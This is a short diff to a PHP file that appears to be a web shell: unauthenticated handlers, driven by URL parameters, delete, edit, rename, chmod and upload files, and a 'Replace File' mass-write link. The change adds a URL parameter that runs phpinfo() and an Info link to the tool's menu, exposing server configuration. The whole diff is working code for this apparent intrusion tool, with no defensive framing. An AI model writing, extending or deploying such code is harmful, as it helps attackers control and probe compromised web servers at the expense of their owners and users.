@@ -1266,6 +1266,9 @@ if ($_GET['do'] == 'delete') {
     header("Location: ?".cwd()."");
   }
 }
+if (isset($_GET['info'])) {
+    phpinfo();
+}
 @edit("edit", $_GET['file']);
 @renames("rename", $_GET['file']);
 @chmods("chmod", $_GET['file']);
@@ -1286,6 +1289,7 @@ if ($_GET['do'] == 'delete') {
     <tr>
       <th colspan="5">
         <a class="tools" href="?path=<?php print @cwd() ?>&home">Home</a>
+        <a class="tools" href="?path=<?php print @cwd() ?>&info" target="_blank">Info</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=upload">Upload</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=making">Make File</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=masswrite">Replace File</a>
